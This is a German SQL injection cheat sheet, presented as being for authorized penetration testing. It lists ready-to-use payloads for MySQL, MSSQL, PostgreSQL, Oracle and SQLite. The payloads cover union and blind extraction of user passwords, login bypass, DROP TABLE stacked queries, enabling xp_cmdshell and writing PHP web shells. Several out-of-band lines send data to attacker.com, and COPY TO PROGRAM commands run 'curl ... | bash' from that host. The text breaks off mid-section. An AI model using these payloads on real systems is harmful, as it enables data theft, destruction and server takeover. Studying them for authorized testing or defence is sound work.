# SQL Injection - Autorisierter Pentest Cheat Sheet

**Warnung**: Diese Methoden sind NUR für autorisierte Penetrationstests, CTF-Challenges, Sicherheitsforschung und forensische Analysen auf eigenen/genehmigten Systemen.

---

## Inhaltsverzeichnis
1. [SQL Injection Grundlagen](#sql-injection-grundlagen)
2. [Injection Points finden](#injection-points-finden)
3. [Detection & Fingerprinting](#detection--fingerprinting)
4. [Error-based SQL Injection](#error-based-sql-injection)
5. [Union-based SQL Injection](#union-based-sql-injection)
6. [Boolean-based Blind SQLi](#boolean-based-blind-sqli)
7. [Time-based Blind SQLi](#time-based-blind-sqli)
8. [Stacked Queries](#stacked-queries)
9. [Out-of-Band SQLi](#out-of-band-sqli)
10. [Second-Order SQLi](#second-order-sqli)
11. [Database-Specific Injection](#database-specific-injection)
12. [Authentication Bypass](#authentication-bypass)
13. [Data Exfiltration](#data-exfiltration)
14. [File Operations](#file-operations)
15. [Command Execution](#command-execution)
16. [WAF Bypass Techniques](#waf-bypass-techniques)
17. [sqlmap Automation](#sqlmap-automation)
18. [Manual Exploitation](#manual-exploitation)
19. [NoSQL Injection](#nosql-injection)
20. [Prevention & Remediation](#prevention--remediation)

---

## SQL Injection Grundlagen

### 1. Was ist SQL Injection?

**Definition**: Einschleusen von SQL-Code in Anwendungs-Queries um Datenbank zu manipulieren

**Vulnerable Code Beispiel (PHP)**:
```php
// VULNERABLE - Nie so machen!
$id = $_GET['id'];
$query = "SELECT * FROM users WHERE id = $id";

$username = $_POST['username'];
$password = $_POST['password'];
$query = "SELECT * FROM users WHERE username = '$username' AND password = '$password'";
```

**Sichere Alternative**:
```php
// SECURE - Prepared Statements
$stmt = $pdo->prepare("SELECT * FROM users WHERE id = ?");
$stmt->execute([$id]);

$stmt = $pdo->prepare("SELECT * FROM users WHERE username = ? AND password = ?");
$stmt->execute([$username, $password]);
```

### 2. SQL Injection Typen

#### In-band SQLi (klassisch)
```
- Error-based: SQL Errors für Information Gathering
- Union-based: UNION queries für Daten-Extraktion
```

#### Inferential SQLi (Blind)
```
- Boolean-based: True/False Responses analysieren
- Time-based: Delays für Information Extraction
```

#### Out-of-band SQLi
```
- DNS Exfiltration
- HTTP Requests
- Email/File Output
```

### 3. Injection Contexts

#### Numeric Context (ohne Quotes)
```sql
-- Original Query:
SELECT * FROM users WHERE id = 1

-- Injection:
1 OR 1=1
1 AND 1=2
1 UNION SELECT NULL
```

#### String Context (mit Single Quotes)
```sql
-- Original Query:
SELECT * FROM users WHERE username = 'admin'

-- Injection:
admin' OR '1'='1
admin'--
admin' UNION SELECT NULL--
```

#### String Context (mit Double Quotes)
```sql
-- Original Query:
SELECT * FROM users WHERE username = "admin"

-- Injection:
admin" OR "1"="1
admin"--
admin" UNION SELECT NULL--
```

---

## Injection Points finden

### 4. Manuelle Detection

#### URL Parameter (GET)
```bash
# Test Parameter
http://target.com/page.php?id=1
http://target.com/page.php?id=1'
http://target.com/page.php?id=1"
http://target.com/page.php?id=1`

# Multiple Parameters
http://target.com/page.php?id=1&category=books
# Test beide: id und category
```

#### POST Parameter
```bash
# Login Form
username=admin&password=test

# Test with payloads:
username=admin'&password=test
username=admin"&password=test
username=admin' OR '1'='1&password=test
```

#### Headers
```http
# User-Agent
User-Agent: ' OR 1=1--

# Cookie
Cookie: sessionid=abc123'; DROP TABLE users--

# Referer
Referer: http://evil.com' UNION SELECT NULL--

# X-Forwarded-For
X-Forwarded-For: 127.0.0.1' OR '1'='1
```

#### JSON POST Data
```json
{
    "username": "admin' OR '1'='1",
    "password": "anything"
}
```

#### XML POST Data
```xml
<?xml version="1.0"?>
<user>
    <username>admin' OR '1'='1</username>
    <password>test</password>
</user>
```

### 5. Automated Detection

#### Burp Suite
```
1. Capture Request in Proxy
2. Send to Repeater
3. Test payloads manually

# Scanner (Professional):
Right-click -> Scan -> SQL Injection
```

#### OWASP ZAP
```
1. Spider the application
2. Active Scan
3. Review SQL Injection findings
```

#### Nikto
```bash
nikto -h http://target.com -Tuning 9
# -Tuning 9: SQL Injection checks
```

---

## Detection & Fingerprinting

### 6. SQL Injection Detection Tests

#### Single Quote Test
```sql
-- Input:
'

-- Error Messages zu erwarten:
MySQL: "You have an error in your SQL syntax"
MSSQL: "Unclosed quotation mark"
PostgreSQL: "unterminated quoted string"
Oracle: "ORA-01756: quoted string not properly terminated"

-- Wenn keine Errors aber unterschiedliches Verhalten -> Blind SQLi
```

#### Double Quote Test
```sql
-- Input:
"

-- Einige Datenbanken verwenden " für Identifier
```

#### Comment Test
```sql
-- MySQL/MSSQL/PostgreSQL:
--
#
/* */

-- Oracle:
--
/* */

-- Test:
' OR 1=1--
' OR 1=1#
' OR 1=1/*
```

#### Boolean Test (AND/OR)
```sql
-- Original: ?id=1
-- Test:
?id=1 AND 1=1  -- Should show normal page
?id=1 AND 1=2  -- Should show different/error

?id=1 OR 1=1   -- May show different data
?id=1 OR 1=2   -- Should show normal page
```

#### Time Delay Test
```sql
-- MySQL:
?id=1' AND SLEEP(5)--

-- MSSQL:
?id=1' WAITFOR DELAY '0:0:5'--

-- PostgreSQL:
?id=1' AND pg_sleep(5)--

-- Oracle:
?id=1' AND DBMS_LOCK.SLEEP(5)--

-- Wenn 5 Sekunden Verzögerung -> SQLi confirmed
```

#### Order By Test
```sql
-- Bestimme Anzahl der Columns
?id=1' ORDER BY 1--   (works)
?id=1' ORDER BY 2--   (works)
?id=1' ORDER BY 3--   (works)
?id=1' ORDER BY 10--  (error)

-- Wenn Error bei ORDER BY 10 -> weniger als 10 Spalten
-- Binary search um genau zu bestimmen
```

### 7. Database Fingerprinting

#### Version Detection
```sql
-- MySQL:
VERSION()
@@VERSION
@@GLOBAL.VERSION

-- MSSQL:
@@VERSION
SERVERPROPERTY('productversion')

-- PostgreSQL:
VERSION()

-- Oracle:
SELECT banner FROM v$version
SELECT version FROM v$instance

-- SQLite:
sqlite_version()
```

#### Database Name
```sql
-- MySQL:
DATABASE()
SCHEMA()

-- MSSQL:
DB_NAME()

-- PostgreSQL:
current_database()

-- Oracle:
SELECT name FROM v$database
```

#### Current User
```sql
-- MySQL:
USER()
CURRENT_USER()
SESSION_USER()

-- MSSQL:
USER_NAME()
CURRENT_USER
SYSTEM_USER

-- PostgreSQL:
current_user
user

-- Oracle:
SELECT user FROM dual
```

#### Database Specific Functions
```sql
-- MySQL specific:
CONCAT()
GROUP_CONCAT()
SUBSTRING()

-- MSSQL specific:
LEN()
SUBSTRING()
+  (string concatenation)

-- PostgreSQL specific:
STRING_AGG()
||  (string concatenation)

-- Oracle specific:
LISTAGG()
||  (string concatenation)
```

---

## Error-based SQL Injection

### 8. MySQL Error-based

#### UpdateXML Error
```sql
' AND updatexml(null,concat(0x0a,version()),null)--

' AND updatexml(null,concat(0x0a,(SELECT table_name FROM information_schema.tables LIMIT 1)),null)--

' AND updatexml(null,concat(0x0a,database()),null)--
```

#### ExtractValue Error
```sql
' AND extractvalue(null,concat(0x0a,version()))--

' AND extractvalue(null,concat(0x0a,database()))--

' AND extractvalue(null,concat(0x0a,(SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database())))--
```

#### Double Query Error
```sql
' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(version(),0x0a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--

' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(database(),0x0a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--
```

#### EXP Overflow Error
```sql
' AND EXP(~(SELECT * FROM (SELECT version())a))--

' AND EXP(~(SELECT * FROM (SELECT database())a))--
```

### 9. MSSQL Error-based

#### CONVERT Error
```sql
' AND 1=CONVERT(int,@@version)--

' AND 1=CONVERT(int,db_name())--

' AND 1=CONVERT(int,(SELECT TOP 1 name FROM sysobjects WHERE xtype='U'))--
```

#### CAST Error
```sql
' AND 1=CAST(@@version AS int)--

' AND 1=CAST(db_name() AS int)--
```

### 10. PostgreSQL Error-based

#### CAST Error
```sql
' AND 1=CAST(version() AS int)--

' AND 1=CAST(current_database() AS int)--

' AND 1=CAST((SELECT table_name FROM information_schema.tables LIMIT 1) AS int)--
```

### 11. Oracle Error-based

#### UTL_INADDR Error
```sql
' AND 1=UTL_INADDR.get_host_name((SELECT user FROM dual))--

' AND 1=UTL_INADDR.get_host_name((SELECT banner FROM v$version WHERE rownum=1))--
```

#### CTXSYS.DRITHSX Error
```sql
' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT user FROM dual))--
```

---

## Union-based SQL Injection

### 12. UNION Attack Basics

#### Schritt 1: Anzahl Spalten bestimmen
```sql
-- ORDER BY Methode:
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
' ORDER BY 10--   (Error -> weniger als 10 Spalten)

-- UNION SELECT NULL Methode:
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
' UNION SELECT NULL,NULL,NULL,NULL--   (Success -> 4 Spalten)
```

#### Schritt 2: Ausgabe-Spalten finden
```sql
-- Mit verschiedenen Werten testen:
' UNION SELECT 1,2,3,4--
' UNION SELECT 'a','b','c','d'--
' UNION SELECT NULL,NULL,NULL,NULL--

-- Zahlen 1,2,3,4 erscheinen auf der Seite? -> Diese Spalten sind sichtbar
```

#### Schritt 3: Daten extrahieren
```sql
-- Version:
' UNION SELECT NULL,version(),NULL,NULL--

-- Database:
' UNION SELECT NULL,database(),NULL,NULL--

-- Tables:
' UNION SELECT NULL,table_name,NULL,NULL FROM information_schema.tables--

-- Columns:
' UNION SELECT NULL,column_name,NULL,NULL FROM information_schema.columns WHERE table_name='users'--

-- Data:
' UNION SELECT NULL,username,password,NULL FROM users--
```

### 13. MySQL UNION Injection

#### Information Schema
```sql
-- All Databases:
' UNION SELECT NULL,schema_name,NULL FROM information_schema.schemata--

-- Tables in current DB:
' UNION SELECT NULL,table_name,NULL FROM information_schema.tables WHERE table_schema=database()--

-- All tables:
' UNION SELECT NULL,table_schema,table_name FROM information_schema.tables--

-- Columns:
' UNION SELECT NULL,column_name,NULL FROM information_schema.columns WHERE table_name='users'--

-- Data extraction:
' UNION SELECT NULL,username,password FROM users--
' UNION SELECT NULL,GROUP_CONCAT(username,0x3a,password),NULL FROM users--
```

#### MySQL Specific Payloads
```sql
-- Load File:
' UNION SELECT NULL,LOAD_FILE('/etc/passwd'),NULL--

-- Into Outfile (Write):
' UNION SELECT NULL,'<?php system($_GET["cmd"]); ?>',NULL INTO OUTFILE '/var/www/html/shell.php'--

-- Current User & Privileges:
' UNION SELECT NULL,user(),NULL--
' UNION SELECT NULL,current_user(),NULL--
' UNION SELECT NULL,grantee,privilege_type FROM information_schema.user_privileges--
```

### 14. MSSQL UNION Injection

#### System Tables
```sql
-- Databases:
' UNION SELECT NULL,name,NULL FROM master..sysdatabases--

-- Tables:
' UNION SELECT NULL,name,NULL FROM sysobjects WHERE xtype='U'--

-- Columns:
' UNION SELECT NULL,name,NULL FROM syscolumns WHERE id=(SELECT id FROM sysobjects WHERE name='users')--

-- Data:
' UNION SELECT NULL,username,password FROM users--
```

#### MSSQL Specific
```sql
-- Version:
' UNION SELECT NULL,@@version,NULL--

-- Current DB:
' UNION SELECT NULL,db_name(),NULL--

-- Current User:
' UNION SELECT NULL,user_name(),NULL--
' UNION SELECT NULL,system_user,NULL--

-- Linked Servers:
' UNION SELECT NULL,name,NULL FROM master..sysservers--
```

### 15. PostgreSQL UNION Injection
```sql
-- Version:
' UNION SELECT NULL,version(),NULL--

-- Current Database:
' UNION SELECT NULL,current_database(),NULL--

-- Tables:
' UNION SELECT NULL,tablename,NULL FROM pg_tables WHERE schemaname='public'--

-- Columns:
' UNION SELECT NULL,column_name,NULL FROM information_schema.columns WHERE table_name='users'--

-- Data:
' UNION SELECT NULL,username,password FROM users--

-- Multiple columns concatenated:
' UNION SELECT NULL,username||':'||password,NULL FROM users--
```

### 16. Oracle UNION Injection
```sql
-- Version:
' UNION SELECT NULL,banner,NULL FROM v$version--

-- Current User:
' UNION SELECT NULL,user,NULL FROM dual--

-- Tables:
' UNION SELECT NULL,table_name,NULL FROM all_tables--
' UNION SELECT NULL,table_name,NULL FROM user_tables--

-- Columns:
' UNION SELECT NULL,column_name,NULL FROM all_tab_columns WHERE table_name='USERS'--

-- Data:
' UNION SELECT NULL,username,password FROM users--

-- Concatenation:
' UNION SELECT NULL,username||':'||password,NULL FROM users--
```
**Oracle Besonderheit**: UNION muss immer FROM haben (z.B. FROM dual)

---

## Boolean-based Blind SQLi

### 17. Boolean-based Detection
```sql
-- Original: ?id=1

-- True condition (Seite normal):
?id=1' AND '1'='1
?id=1' AND 1=1--

-- False condition (Seite anders/leer):
?id=1' AND '1'='2
?id=1' AND 1=2--

-- Wenn unterschiedliches Verhalten -> Blind SQLi möglich
```

### 18. Boolean-based Data Extraction

#### Character by Character Extraction
```sql
-- MySQL - Database Name:
?id=1' AND SUBSTRING(database(),1,1)='a'--   (false)
?id=1' AND SUBSTRING(database(),1,1)='b'--   (false)
...
?id=1' AND SUBSTRING(database(),1,1)='t'--   (true!) -> erster Buchstabe ist 't'

?id=1' AND SUBSTRING(database(),2,1)='e'--   (true!) -> zweiter Buchstabe ist 'e'
...

-- Alternative ASCII:
?id=1' AND ASCII(SUBSTRING(database(),1,1))=116--   (true, 116='t')
?id=1' AND ASCII(SUBSTRING(database(),1,1))>100--   (true)
?id=1' AND ASCII(SUBSTRING(database(),1,1))>110--   (true)
?id=1' AND ASCII(SUBSTRING(database(),1,1))>115--   (true)
?id=1' AND ASCII(SUBSTRING(database(),1,1))>117--   (false)
-- Binary search: 116 = 't'
```

#### Length Detection
```sql
-- MySQL:
?id=1' AND LENGTH(database())=4--    (false)
?id=1' AND LENGTH(database())=8--    (true) -> DB name hat 8 Zeichen

-- MSSQL:
?id=1' AND LEN(db_name())=8--

-- PostgreSQL:
?id=1' AND LENGTH(current_database())=8--

-- Oracle:
?id=1' AND LENGTH((SELECT user FROM dual))=6--
```

#### Table Enumeration
```sql
-- MySQL - Check if table exists:
?id=1' AND (SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=database() AND table_name='users')=1--

-- Extract table name character by character:
?id=1' AND SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1),1,1)='u'--
```

#### Data Extraction
```sql
-- MySQL - Extract password from users:
?id=1' AND SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='a'--

-- Mit ASCII + Binary Search schneller:
?id=1' AND ASCII(SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1))>100--
```

### 19. Advanced Boolean Techniques

#### CASE/IF Statements
```sql
-- MySQL IF:
?id=1' AND IF(1=1,1,0)--   (true)
?id=1' AND IF(1=2,1,0)--   (false)

?id=1' AND IF(ASCII(SUBSTRING(database(),1,1))=116,1,0)--

-- MSSQL CASE:
?id=1' AND CASE WHEN 1=1 THEN 1 ELSE 0 END=1--

-- PostgreSQL CASE:
?id=1' AND CASE WHEN 1=1 THEN CAST(1 AS int) ELSE CAST(0 AS int) END=1--
```

#### Boolean Substring Comparison
```sql
-- MySQL:
?id=1' AND LOCATE('admin',(SELECT username FROM users LIMIT 1))=1--

-- MSSQL:
?id=1' AND CHARINDEX('admin',(SELECT TOP 1 username FROM users))=1--

-- PostgreSQL:
?id=1' AND POSITION('admin' IN (SELECT username FROM users LIMIT 1))=1--
```

---

## Time-based Blind SQLi

### 20. Time-based Detection

#### MySQL
```sql
-- SLEEP:
?id=1' AND SLEEP(5)--

-- BENCHMARK:
?id=1' AND BENCHMARK(5000000,MD5('test'))--

-- Test:
?id=1' AND IF(1=1,SLEEP(5),0)--   (5 sec delay)
?id=1' AND IF(1=2,SLEEP(5),0)--   (no delay)
```

#### MSSQL
```sql
-- WAITFOR DELAY:
?id=1' WAITFOR DELAY '0:0:5'--

?id=1'; IF 1=1 WAITFOR DELAY '0:0:5'--   (5 sec delay)
?id=1'; IF 1=2 WAITFOR DELAY '0:0:5'--   (no delay)
```

#### PostgreSQL
```sql
-- pg_sleep:
?id=1' AND pg_sleep(5)--

?id=1' AND CASE WHEN 1=1 THEN pg_sleep(5) ELSE pg_sleep(0) END--
```

#### Oracle
```sql
-- DBMS_LOCK.SLEEP:
?id=1' AND DBMS_LOCK.SLEEP(5)--

-- UTL_INADDR (DNS lookup delay):
?id=1' AND UTL_INADDR.get_host_name('nonexistent.domain.com')=1--
```

#### SQLite
```sql
-- Kein direktes sleep(), aber heavy query:
?id=1' AND (SELECT COUNT(*) FROM sqlite_master WHERE name LIKE '%' AND randomblob(100000000))--
```

### 21. Time-based Data Extraction

#### Advanced Time-based Payloads (Database-Specific)

**Quick Reference Table:**

| Database   | Time-based Payload                                                                                      | Credits                                   |
| ---------- | ------------------------------------------------------------------------------------------------------- | ----------------------------------------- |
| MySQL      | `' OR IF((NOW()=SYSDATE()),SLEEP(1),1)='0`                                                             | Coffin                                    |
| PostgreSQL | `' OR (CASE WHEN ((CLOCK_TIMESTAMP() - NOW()) < '0:0:1') THEN (SELECT '1'\|PG_SLEEP(1)) ELSE '0' END)='1` | Tib3rius                                  |
| MSSQL      | `' WAITFOR DELAY '0:0:5'--`                                                                             | Standard                                  |
| Oracle     | `' OR ROWNUM = '1`                                                                                      | Richard Moore                             |
| SQLite     | `' OR ROWID = '1`                                                                                       | Tib3rius                                  |

#### MySQL Character Extraction
```sql
-- Database Name:
?id=1' AND IF(SUBSTRING(database(),1,1)='t',SLEEP(5),0)--   (delay? -> 't')
?id=1' AND IF(SUBSTRING(database(),2,1)='e',SLEEP(5),0)--   (delay? -> 'e')

-- Advanced MySQL Time-based:
?id=1' OR IF((NOW()=SYSDATE()),SLEEP(1),1)='0

-- ASCII Binary Search:
?id=1' AND IF(ASCII(SUBSTRING(database(),1,1))>100,SLEEP(5),0)--
?id=1' AND IF(ASCII(SUBSTRING(database(),1,1))>110,SLEEP(5),0)--
...
```

#### MSSQL Character Extraction
```sql
-- Database Name:
?id=1'; IF SUBSTRING(db_name(),1,1)='m' WAITFOR DELAY '0:0:5'--

-- User extraction:
?id=1'; IF SUBSTRING(user_name(),1,1)='d' WAITFOR DELAY '0:0:5'--
```

#### PostgreSQL Character Extraction
```sql
?id=1' AND CASE WHEN SUBSTRING(current_database(),1,1)='p' THEN pg_sleep(5) ELSE pg_sleep(0) END--

-- Advanced PostgreSQL Time-based:
?id=1' OR (CASE WHEN ((CLOCK_TIMESTAMP() - NOW()) < '0:0:1') THEN (SELECT '1'||PG_SLEEP(1)) ELSE '0' END)='1
```

#### Oracle
```sql
-- ROWNUM-based:
?id=1' OR ROWNUM = '1

-- DBMS_LOCK.SLEEP:
?id=1' AND DBMS_LOCK.SLEEP(5)--
```

#### SQLite
```sql
-- ROWID-based:
?id=1' OR ROWID = '1

-- Heavy query for delay:
?id=1' AND (SELECT COUNT(*) FROM sqlite_master WHERE name LIKE '%' AND randomblob(100000000))--
```

---

## Stacked Queries

### 22. Stacked Queries (Multiple Statements)

**Beschreibung**: Mehrere SQL Statements mit ; trennen

#### MySQL (Nicht immer möglich - mysqli_multi_query benötigt)
```sql
?id=1'; DROP TABLE users--

?id=1'; INSERT INTO users VALUES ('hacker','password')--

?id=1'; UPDATE users SET password='hacked' WHERE username='admin'--
```

#### MSSQL (Häufig möglich)
```sql
?id=1; DROP TABLE users--

?id=1; EXEC xp_cmdshell('whoami')--

?id=1; INSERT INTO users VALUES ('hacker','password')--

-- Enable xp_cmdshell:
?id=1; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE--
```

#### PostgreSQL
```sql
?id=1; DROP TABLE users--

?id=1; COPY (SELECT '') TO PROGRAM 'curl http://attacker.com/shell.sh | bash'--

?id=1; CREATE TABLE cmd_exec(cmd_output text)--
```

#### Oracle
```sql
-- Stacked queries oft nicht möglich
-- Alternative: PL/SQL Blocks
```

---

## Out-of-Band SQLi

### 23. DNS Exfiltration

#### MySQL (Windows only - LOAD_FILE + UNC Path)
```sql
' AND LOAD_FILE(CONCAT('\\\\',(SELECT database()),'.attacker.com\\a'))--

' AND LOAD_FILE(CONCAT('\\\\',(SELECT password FROM users WHERE username='admin'),'.attacker.com\\a'))--
```

#### MSSQL (xp_dirtree, xp_fileexist)
```sql
-- DNS Exfiltration:
'; DECLARE @data varchar(1024); SET @data=(SELECT db_name()); EXEC('master..xp_dirtree "\\'+@data+'.attacker.com\a"')--

'; EXEC master..xp_dirtree '\\'+@@version+'.attacker.com\a'--

'; EXEC master..xp_fileexist '\\attacker.com\share'--
```

#### Oracle (UTL_HTTP, UTL_INADDR)
```sql
-- DNS Lookup:
' AND UTL_INADDR.get_host_address((SELECT user FROM dual)||'.attacker.com')=1--

-- HTTP Request:
' AND UTL_HTTP.request('http://attacker.com/'||(SELECT user FROM dual))=1--
```

#### PostgreSQL
```sql
-- COPY TO PROGRAM:
'; COPY (SELECT user) TO PROGRAM 'nslookup `whoami`.attacker.com'--

-- Large Object (lo_import with UNC path - Windows):
'; SELECT lo_import('\\\\attacker.com\\share\\file')--
```

### 24. HTTP Exfiltration

#### MySQL
```sql
-- Benötigt SELECT INTO OUTFILE permissions:
' UNION SELECT NULL,LOAD_FILE('/etc/passwd'),NULL INTO OUTFILE '/var/www/html/data.txt'--
```

#### MSSQL
```sql
-- OLE Automation:
'; DECLARE @obj INT; EXEC sp_OACreate 'MSXML2.ServerXMLHTTP', @obj OUT; EXEC sp_OAMethod @obj, 'open', NULL, 'GET', 'http://attacker.com/?data='+(SELECT @@version), false; EXEC sp_OAMethod @obj, 'send'--
```

#### Oracle
```sql
-- UTL_HTTP:
' AND UTL_HTTP.request('http://attacker.com/?data='||(SELECT banner FROM v$version WHERE rownum=1))=1--
```

---

## Second-Order SQLi

### 25. Second-Order SQL Injection

**Beschreibung**: Payload wird gespeichert und später in anderem Kontext ausgeführt

#### Beispiel Szenario:
```
1. Registration: username = admin'--
   -> Gespeichert in DB

2. Login mit diesem User
   -> Query: SELECT * FROM users WHERE username = 'admin'--' AND password = '...'
   -> Kommentar ignoriert password check -> Login success
```

#### Exploitation:
```sql
-- Registration Step (Payload speichern):
Username: admin' UNION SELECT null,null,null--
Email: test@test.com
Password: anything

-- Login/Profile/Settings Step (Payload wird ausgeführt):
-- Wenn die Applikation username in Query verwendet ohne Escaping:
SELECT * FROM profiles WHERE username = 'admin' UNION SELECT null,null,null--'
```

#### Weitere Injection Points:
```
- Profile Name -> Angezeigt in Admin Panel
- Comment -> Moderator Review
- File Name -> File Listing
- Email -> Email Templates
```

---

## Database-Specific Injection

### 26. MySQL Specific Techniques

#### Comment Syntax
```sql
-- Inline Comment:
/*! SQL Code */   -- MySQL specific, executed only by MySQL

-- Version specific:
/*!50000 SQL Code */   -- Only MySQL >= 5.0
/*!32302 SQL Code */   -- Only MySQL >= 3.23.02
```

#### Information Gathering
```sql
-- Version:
SELECT @@version
SELECT VERSION()

-- Database:
SELECT DATABASE()
SELECT SCHEMA()

-- User:
SELECT USER()
SELECT CURRENT_USER()
SELECT SYSTEM_USER()

-- Hostname:
SELECT @@hostname

-- Data Directory:
SELECT @@datadir

-- All Variables:
SELECT * FROM information_schema.GLOBAL_VARIABLES

-- File Privileges:
SELECT file_priv FROM mysql.user WHERE user='root'
```

#### File Operations
```sql
-- Read File:
SELECT LOAD_FILE('/etc/passwd')
SELECT LOAD_FILE(0x2f6574632f706173737764)  -- Hex encoded

-- Write File (requires FILE privilege):
SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php'

-- Using DUMPFILE (for binary):
SELECT LOAD_FILE('/path/to/binary') INTO DUMPFILE '/tmp/binary'
```

#### User Enumeration
```sql
-- All Users:
SELECT user,host FROM mysql.user

-- Current User Privileges:
SELECT * FROM information_schema.user_privileges WHERE grantee=CURRENT_USER()

-- Password Hashes:
SELECT user,password FROM mysql.user   -- MySQL < 5.7
SELECT user,authentication_string FROM mysql.user   -- MySQL >= 5.7
```

### 27. MSSQL Specific Techniques

#### Comment Syntax
```sql
-- Single line:
--

-- Multi-line:
/* */
```

#### Information Gathering
```sql
-- Version:
SELECT @@version
SELECT SERVERPROPERTY('productversion')

-- Database:
SELECT DB_NAME()

-- Current User:
SELECT USER_NAME()
SELECT SYSTEM_USER
SELECT CURRENT_USER

-- Hostname:
SELECT HOST_NAME()
SELECT @@SERVERNAME

-- Databases:
SELECT name FROM master..sysdatabases

-- Linked Servers:
SELECT name FROM master..sysservers
```

#### Command Execution (xp_cmdshell)
```sql
-- Enable xp_cmdshell:
EXEC sp_configure 'show advanced options', 1
RECONFIGURE
EXEC sp_configure 'xp_cmdshell', 1
RECONFIGURE

-- Execute Command:
EXEC xp_cmdshell 'whoami'
EXEC master..xp_cmdshell 'dir C:\'

-- One-liner enable + execute:
'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; EXEC xp_cmdshell 'whoami'--
```

#### File Operations
```sql
-- Read File (via OPENROWSET):
SELECT * FROM OPENROWSET(BULK 'C:\windows\win.ini', SINGLE_CLOB) AS Contents

-- Using xp_cmdshell:
EXEC xp_cmdshell 'type C:\windows\win.ini'

-- Write File:
EXEC xp_cmdshell 'echo "<?php system($_GET[\"cmd\"]); ?>" > C:\inetpub\wwwroot\shell.php'
```

#### User Enumeration
```sql
-- All Logins:
SELECT name FROM master..syslogins

-- Current User Roles:
SELECT IS_SRVROLEMEMBER('sysadmin')
SELECT IS_MEMBER('db_owner')

-- Permissions:
SELECT * FROM fn_my_permissions(NULL, 'SERVER')
```

### 28. PostgreSQL Specific Techniques

#### Comment Syntax
```sql
-- Single line:
--

-- Multi-line:
/* */
```

#### Information Gathering
```sql
-- Version:
SELECT version()

-- Database:
SELECT current_database()

-- User:
SELECT current_user
SELECT session_user
SELECT user

-- All Databases:
SELECT datname FROM pg_database

-- All Tables:
SELECT tablename FROM pg_tables WHERE schemaname='public'

-- All Columns:
SELECT column_name FROM information_schema.columns WHERE table_name='users'
```

#### Command Execution
```sql
-- COPY TO PROGRAM (PostgreSQL 9.3+):
COPY (SELECT '') TO PROGRAM 'id'

-- Full command execution:
'; COPY (SELECT '') TO PROGRAM 'curl http://attacker.com/shell.sh | bash'--

-- Data exfiltration:
'; COPY (SELECT password FROM users) TO PROGRAM 'curl -d @- http://attacker.com/'--
```

#### File Operations
```sql
-- Read File (requires superuser):
CREATE TABLE temp(data text);
COPY temp FROM '/etc/passwd';
SELECT * FROM temp;

-- Write File:
COPY (SELECT 'data') TO '/tmp/output.txt'

-- Large Objects:
SELECT lo_import('/etc/passwd')
SELECT lo_get(12345)  -- 12345 = OID from lo_import
```

### 29. Oracle Specific Techniques

#### Comment Syntax
```sql
-- Single line:
--

-- Multi-line:
/* */
```

#### Information Gathering
```sql
-- Version:
SELECT banner FROM v$version
SELECT version FROM v$instance

-- Database:
SELECT name FROM v$database
SELECT global_name FROM global_name

-- User:
SELECT user FROM dual

-- All Tables:
SELECT table_name FROM all_tables
SELECT table_name FROM user_tables

-- All Columns:
SELECT column_name FROM all_tab_columns WHERE table_name='USERS'
```

#### Oracle Notes
```sql
-- FROM dual erforderlich für SELECT ohne Tabelle:
SELECT user FROM dual
SELECT 1 FROM dual

-- Concatenation:
SELECT 'a'||'b' FROM dual

-- String Quotes:
SELECT 'O''Reilly' FROM dual   -- Escape ' mit ''
```

#### File Operations (requires DBA)
```sql
-- UTL_FILE:
DECLARE
  f UTL_FILE.FILE_TYPE;
  s VARCHAR2(200);
BEGIN
  f := UTL_FILE.FOPEN('/tmp', 'output.txt', 'W');
  UTL_FILE.PUT_LINE(f, 'test data');
  UTL_FILE.FCLOSE(f);
END;
```

#### HTTP Requests
```sql
-- UTL_HTTP:
SELECT UTL_HTTP.request('http://attacker.com') FROM dual

-- With data:
SELECT UTL_HTTP.request('http://attacker.com/?data='||(SELECT user FROM dual)) FROM dual
```

### 30. SQLite Specific Techniques

#### Information Gathering
```sql
-- Version:
SELECT sqlite_version()

-- Tables:
SELECT name FROM sqlite_master WHERE type='table'

-- Schema:
SELECT sql FROM sqlite_master WHERE type='table' AND name='users'

-- Columns:
PRAGMA table_info(users)
```

#### Notes
```sql
-- Keine INFORMATION_SCHEMA
-- Keine Stored Procedures
-- Keine User Management
-- File operations begrenzt
-- Oft in embedded applications (mobiles, IoT)
```

---

## Authentication Bypass

### 31. Login Bypass Techniques

#### Basic Bypass (OR 1=1)
```sql
-- Username Field:
admin' OR '1'='1
admin' OR 1=1--
admin'--
admin' #

-- Password Field (wenn beide checked):
anything' OR '1'='1

-- Both fields:
Username: admin' OR '1'='1'--
Password: anything
```

#### Comment-based Bypass
```sql
-- Username:
admin'--
admin'#
admin'/*

-- Query becomes:
SELECT * FROM users WHERE username='admin'--' AND password='...'
-- Password check commented out
```

#### Always True Conditions
```sql
-- MySQL:
' OR '1'='1
' OR 1=1--
' OR 'a'='a
' OR ''='
'='

-- MSSQL:
' OR 1=1--
' OR 'x'='x

-- PostgreSQL/Oracle:
' OR '1'='1'--
```

#### UNION-based Login
```sql
-- If application selects first row:
' UNION SELECT 'admin','5f4dcc3b5aa765d61d8327deb882cf99'--
-- MD5('password') = 5f4dcc3b5aa765d61d8327deb882cf99

-- Mit bekanntem hash:
' UNION SELECT 'admin','known_hash','admin@email.com'--
```

#### Boolean-based Bypass
```sql
-- If username exists:
admin' AND '1'='1   (login success if admin exists)
admin' AND '1'='2   (login fail)

-- User enumeration:
admin' AND (SELECT COUNT(*) FROM users WHERE username='admin')=1--
```

### 32. Advanced Bypass Techniques

#### Null Bytes
```sql
admin'%00
admin'--+%00
admin%00' OR '1'='1
```

#### Case Variations
```sql
